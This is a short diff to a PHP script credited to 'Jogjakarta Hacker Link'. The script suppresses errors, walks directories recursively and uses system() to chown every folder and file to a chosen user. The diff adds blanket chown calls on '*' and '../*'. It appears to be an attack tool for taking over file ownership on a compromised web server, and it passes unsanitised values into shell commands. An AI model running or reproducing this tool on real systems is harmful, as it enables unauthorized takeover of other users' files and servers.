@@ -7,11 +7,14 @@ Copyright (c) 2019 Jogjakarta Hacker Link
 */
 error_reporting(0);
 function buka($dir,$user){
+    chdir($dir);
     $s=scandir($dir);
     foreach($s as $ss){
         if($ss == "." || $ss == ".."){continue;}else{
             if(is_dir($dir."/".$ss."/")){
                 echo "[*] $user:$user => $ss\n";
+                system("chown $user:$user ../*");
+                system("chown $user:$user *");
                 system("chown $user:$user '$dir/$ss/'");
                 buka($dir."/".$ss."/",$user);
             }else{
